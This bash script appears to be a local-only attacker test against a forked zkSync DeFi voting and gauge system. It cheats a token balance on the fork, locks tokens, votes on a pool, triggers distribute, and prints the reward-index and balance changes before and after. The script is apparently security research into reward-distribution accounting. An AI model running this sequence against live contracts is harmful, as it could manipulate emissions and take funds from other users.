#!/usr/bin/env bash
# Clean-room attacker test on the anvil-zksync fork (LOCAL ONLY; no mainnet txs).
set -uo pipefail
FORK=http://127.0.0.1:8011
VC=0x85D84c774CF8e9fF85342684b0E795Df72A24908
ESC=0xbdE345771Eb0c6adEBc54F41A169ff6311fE096F
V=0xe09A60FAe6d77658b9767A70e2f361b46Dd3f16A
G=0xb3120Ad6C3285fc4E422581d9ad003277802CC47
POOL=0xcD52cbc975fbB802F82A1F92112b1250b5a997Df
A=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
PK=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80

slot18=$(cast storage $V 18 --rpc-url $FORK)
sl_supply=$(cast index address $G 19)
supply_before=$(cast storage $V $sl_supply --rpc-url $FORK)
echo "index(slot18) before:      $slot18"
echo "supplyIndex(gauge) before: $supply_before"
echo "weights(pool) before:      $(cast call $V 'weights(address)(uint256)' $POOL --rpc-url $FORK)"
echo "claimable(gauge) before:   $(cast call $V 'claimable(address)(uint256)' $G --rpc-url $FORK)"
echo "gauge VC before:           $(cast call $VC 'balanceOf(address)(uint256)' $G --rpc-url $FORK)"
echo "voter VC before:           $(cast call $VC 'balanceOf(address)(uint256)' $V --rpc-url $FORK)"

# 1) cheat VC to attacker (fork-only)
SLOT=$(cast index address $A 1)
curl -s -m 15 -X POST $FORK -H 'Content-Type: application/json' --data "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"anvil_setStorageAt\",\"params\":[\"$VC\",\"$SLOT\",\"0x0000000000000000000000000000000000000000000422ca8b0a00a425000000\"]}" > /dev/null
# 2) approve + lock
cast send $VC "approve(address,uint256)" $ESC 5000000000000000000000000 --private-key $PK --gas-limit 1000000 --rpc-url $FORK > /dev/null 2>&1
cast send $ESC "create_lock(uint256,uint256)" 5000000000000000000000000 125000000 --private-key $PK --gas-limit 3000000 --rpc-url $FORK > /dev/null 2>&1
TID=$(cast call $ESC 'tokenOfOwnerByIndex(address,uint256)(uint256)' $A 0 --rpc-url $FORK | awk '{print $1}')
BAL=$(cast call $ESC 'balanceOfNFT(uint256)(uint256)' $TID --rpc-url $FORK | awk '{print $1}')
echo "veNFT id=$TID balance=$BAL"
# 3) vote on the USDC/WETH pool
cast send $V "vote(uint256,address[],uint256[])" $TID "[$POOL]" "[$BAL]" --private-key $PK --gas-limit 3000000 --rpc-url $FORK > /dev/null 2>&1
echo "weights(pool) after vote:  $(cast call $V 'weights(address)(uint256)' $POOL --rpc-url $FORK)"
echo "totalWeight after vote:    $(cast call $V 'totalWeight()(uint256)' --rpc-url $FORK)"
# 4) distribute (fresh week -> mints)
cast send $V "distribute(address[])" "[$G]" --private-key $PK --gas-limit 6000000 --rpc-url $FORK > /dev/null 2>&1
echo "--- after distribute ---"
echo "index(slot18) after:       $(cast storage $V 18 --rpc-url $FORK)"
echo "supplyIndex(gauge) after:  $(cast storage $V $sl_supply --rpc-url $FORK)"
echo "claimable(gauge) after:    $(cast call $V 'claimable(address)(uint256)' $G --rpc-url $FORK)"
echo "gauge VC after:            $(cast call $VC 'balanceOf(address)(uint256)' $G --rpc-url $FORK)"
echo "voter VC after:            $(cast call $VC 'balanceOf(address)(uint256)' $V --rpc-url $FORK)"
echo "attacker VC:               $(cast call $VC 'balanceOf(address)(uint256)' $A --rpc-url $FORK)"
